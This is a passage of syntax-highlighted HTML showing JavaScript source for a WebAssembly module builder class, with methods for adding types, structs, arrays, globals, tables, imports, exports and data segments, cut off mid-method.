          <span class="token keyword">this</span><span class="token punctuation">.</span>explicit<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createCustomSection</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// We use &#123;is_final = true&#125; so that the MVP syntax is generated for</span>
        <span class="token comment">// signatures.</span>
        <span class="token function">addType</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token punctuation">,</span> supertype_idx <span class="token operator">=</span> kNoSuperType<span class="token punctuation">,</span> is_final <span class="token operator">=</span> <span class="token boolean">true</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">var</span> pl <span class="token operator">=</span> type<span class="token punctuation">.</span>params<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token comment">// should have params</span>
          <span class="token keyword">var</span> rl <span class="token operator">=</span> type<span class="token punctuation">.</span>results<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token comment">// should have results</span>
          <span class="token keyword">var</span> type_copy <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">params</span><span class="token operator">:</span> type<span class="token punctuation">.</span>params<span class="token punctuation">,</span>
            <span class="token literal-property property">results</span><span class="token operator">:</span> type<span class="token punctuation">.</span>results<span class="token punctuation">,</span>
            <span class="token literal-property property">is_final</span><span class="token operator">:</span> is_final<span class="token punctuation">,</span>
            <span class="token literal-property property">supertype</span><span class="token operator">:</span> supertype_idx<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>type_copy<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addLiteralStringRef</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>stringrefs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stringrefs<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token parameter">fields<span class="token punctuation">,</span> supertype_idx <span class="token operator">=</span> kNoSuperType<span class="token punctuation">,</span> is_final <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WasmStruct</span><span class="token punctuation">(</span>fields<span class="token punctuation">,</span> is_final<span class="token punctuation">,</span> supertype_idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addArray</span><span class="token punctuation">(</span>
          <span class="token parameter">type<span class="token punctuation">,</span>
          mutability<span class="token punctuation">,</span>
          supertype_idx <span class="token operator">=</span> kNoSuperType<span class="token punctuation">,</span>
          is_final <span class="token operator">=</span> <span class="token boolean">false</span></span>
        <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>
            <span class="token keyword">new</span> <span class="token class-name">WasmArray</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> mutability<span class="token punctuation">,</span> is_final<span class="token punctuation">,</span> supertype_idx<span class="token punctuation">)</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">static</span> <span class="token function">defaultFor</span><span class="token punctuation">(</span><span class="token parameter">type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">case</span> <span class="token literal-property property">kWasmI32</span><span class="token operator">:</span>
              <span class="token keyword">return</span> <span class="token function">wasmI32Const</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token literal-property property">kWasmI64</span><span class="token operator">:</span>
              <span class="token keyword">return</span> <span class="token function">wasmI64Const</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token literal-property property">kWasmF32</span><span class="token operator">:</span>
              <span class="token keyword">return</span> <span class="token function">wasmF32Const</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token literal-property property">kWasmF64</span><span class="token operator">:</span>
              <span class="token keyword">return</span> <span class="token function">wasmF64Const</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token literal-property property">kWasmS128</span><span class="token operator">:</span>
              <span class="token keyword">return</span> <span class="token punctuation">[</span>kSimdPrefix<span class="token punctuation">,</span> kExprS128Const<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token operator">:</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> type <span class="token operator">!=</span> <span class="token string">"number"</span> <span class="token operator">&amp;&amp;</span> type<span class="token punctuation">.</span>opcode <span class="token operator">!=</span> kWasmRefNull<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Non-defaultable type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              <span class="token keyword">let</span> heap_type <span class="token operator">=</span> <span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span> <span class="token operator">?</span> type <span class="token operator">:</span> type<span class="token punctuation">.</span>heap_type<span class="token punctuation">;</span>
              <span class="token keyword">return</span> <span class="token punctuation">[</span>
                kExprRefNull<span class="token punctuation">,</span>
                <span class="token operator">...</span><span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>heap_type<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">,</span>
              <span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addGlobal</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token punctuation">,</span> mutable<span class="token punctuation">,</span> init</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>init <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> init <span class="token operator">=</span> WasmModuleBuilder<span class="token punctuation">.</span><span class="token function">defaultFor</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">checkExpr</span><span class="token punctuation">(</span>init<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> glob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmGlobalBuilder</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> type<span class="token punctuation">,</span> mutable<span class="token punctuation">,</span> init<span class="token punctuation">)</span><span class="token punctuation">;</span>
          glob<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>globals<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_globals<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>globals<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>glob<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> glob<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addTable</span><span class="token punctuation">(</span>
          <span class="token parameter">type<span class="token punctuation">,</span>
          initial_size<span class="token punctuation">,</span>
          max_size <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span>
          init_expr <span class="token operator">=</span> <span class="token keyword">undefined</span></span>
        <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>
            type <span class="token operator">==</span> kWasmI32 <span class="token operator">||</span>
            type <span class="token operator">==</span> kWasmI64 <span class="token operator">||</span>
            type <span class="token operator">==</span> kWasmF32 <span class="token operator">||</span>
            type <span class="token operator">==</span> kWasmF64 <span class="token operator">||</span>
            type <span class="token operator">==</span> kWasmS128 <span class="token operator">||</span>
            type <span class="token operator">==</span> kWasmVoid
          <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Tables must be of a reference type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>init_expr <span class="token operator">!=</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token function">checkExpr</span><span class="token punctuation">(</span>init_expr<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> table <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmTableBuilder</span><span class="token punctuation">(</span>
            <span class="token keyword">this</span><span class="token punctuation">,</span>
            type<span class="token punctuation">,</span>
            initial_size<span class="token punctuation">,</span>
            max_size<span class="token punctuation">,</span>
            init_expr
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
          table<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tables<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> table<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addTag</span><span class="token punctuation">(</span><span class="token parameter">type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> type_index <span class="token operator">=</span> <span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span> <span class="token operator">?</span> type <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> tag_index <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tags<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tags<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>tags<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>type_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> tag_index<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> type<span class="token punctuation">,</span> arg_names</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          arg_names <span class="token operator">=</span> arg_names <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> type_index <span class="token operator">=</span> <span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span> <span class="token operator">?</span> type <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> num_args <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">[</span>type_index<span class="token punctuation">]</span><span class="token punctuation">.</span>params<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>num_args <span class="token operator">&lt;</span> arg_names<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"too many arg names provided"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>num_args <span class="token operator">></span> arg_names<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
            arg_names<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>num_args <span class="token operator">-</span> arg_names<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> func <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmFunctionBuilder</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> type_index<span class="token punctuation">,</span> arg_names<span class="token punctuation">)</span><span class="token punctuation">;</span>
          func<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_funcs<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>functions<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> func<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addImport</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> name<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
              <span class="token string">"Imported functions must be declared before local ones"</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">let</span> type_index <span class="token operator">=</span> <span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span> <span class="token operator">?</span> type <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">module</span><span class="token operator">:</span> module<span class="token punctuation">,</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>
            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalFunction<span class="token punctuation">,</span>
            <span class="token literal-property property">type_index</span><span class="token operator">:</span> type_index<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_funcs<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addImportedGlobal</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> name<span class="token punctuation">,</span> type<span class="token punctuation">,</span> mutable <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>globals<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
              <span class="token string">"Imported globals must be declared before local ones"</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">module</span><span class="token operator">:</span> module<span class="token punctuation">,</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>
            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalGlobal<span class="token punctuation">,</span>
            <span class="token literal-property property">type</span><span class="token operator">:</span> type<span class="token punctuation">,</span>
            <span class="token literal-property property">mutable</span><span class="token operator">:</span> mutable<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_globals<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addImportedMemory</span><span class="token punctuation">(</span>
          <span class="token parameter">module<span class="token punctuation">,</span>
          name<span class="token punctuation">,</span>
          initial <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
          maximum<span class="token punctuation">,</span>
          shared<span class="token punctuation">,</span>
          is_memory64</span>
        <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
              <span class="token string">"Add imported memories before declared memories to avoid messing "</span> <span class="token operator">+</span>
                <span class="token string">"up the indexes"</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">let</span> mem_index <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>
            <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> i<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalMemory
          <span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
          <span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">module</span><span class="token operator">:</span> module<span class="token punctuation">,</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>
            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalMemory<span class="token punctuation">,</span>
            <span class="token literal-property property">initial</span><span class="token operator">:</span> initial<span class="token punctuation">,</span>
            <span class="token literal-property property">maximum</span><span class="token operator">:</span> maximum<span class="token punctuation">,</span>
            <span class="token literal-property property">shared</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span>shared<span class="token punctuation">,</span>
            <span class="token literal-property property">is_memory64</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span>is_memory64<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> mem_index<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addImportedTable</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> name<span class="token punctuation">,</span> initial<span class="token punctuation">,</span> maximum<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
              <span class="token string">"Imported tables must be declared before local ones"</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">module</span><span class="token operator">:</span> module<span class="token punctuation">,</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>
            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalTable<span class="token punctuation">,</span>
            <span class="token literal-property property">initial</span><span class="token operator">:</span> initial<span class="token punctuation">,</span>
            <span class="token literal-property property">maximum</span><span class="token operator">:</span> maximum<span class="token punctuation">,</span>
            <span class="token literal-property property">type</span><span class="token operator">:</span> type <span class="token operator">||</span> kWasmFuncRef<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tables<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addImportedTag</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> name<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tags<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Imported tags must be declared before local ones"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">let</span> type_index <span class="token operator">=</span> <span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span> <span class="token operator">?</span> type <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">module</span><span class="token operator">:</span> module<span class="token punctuation">,</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>
            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalTag<span class="token punctuation">,</span>
            <span class="token literal-property property">type_index</span><span class="token operator">:</span> type_index<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tags<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addExport</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>exports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>
            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalFunction<span class="token punctuation">,</span>
            <span class="token literal-property property">index</span><span class="token operator">:</span> index<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addExportOfKind</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> kind<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>
            index <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span>
            kind <span class="token operator">!=</span> kExternalTable <span class="token operator">&amp;&amp;</span>
            kind <span class="token operator">!=</span> kExternalMemory
          <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
              <span class="token string">"Index for exports other than tables/memories must be provided"</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> index <span class="token operator">!=</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Index for exports must be a number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>exports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span> <span class="token literal-property property">kind</span><span class="token operator">:</span> kind<span class="token punctuation">,</span> <span class="token literal-property property">index</span><span class="token operator">:</span> index <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">setCompilationHint</span><span class="token punctuation">(</span><span class="token parameter">strategy<span class="token punctuation">,</span> baselineTier<span class="token punctuation">,</span> topTier<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>compilation_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">strategy</span><span class="token operator">:</span> strategy<span class="token punctuation">,</span>
            <span class="token literal-property property">baselineTier</span><span class="token operator">:</span> baselineTier<span class="token punctuation">,</span>
            <span class="token literal-property property">topTier</span><span class="token operator">:</span> topTier<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// TODO(manoskouk): Refactor this to use initializer expression for &#123;offset&#125;.</span>
        <span class="token function">addDataSegment</span><span class="token punctuation">(</span><span class="token parameter">offset<span class="token punctuation">,</span> data<span class="token punctuation">,</span> is_global <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> memory_index <span class="token operator">=</span> <span class="token number">0</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">offset</span><span class="token operator">:</span> offset<span class="token punctuation">,</span>
            <span class="token literal-property property">data</span><span class="token operator">:</span> data<span class="token punctuation">,</span>
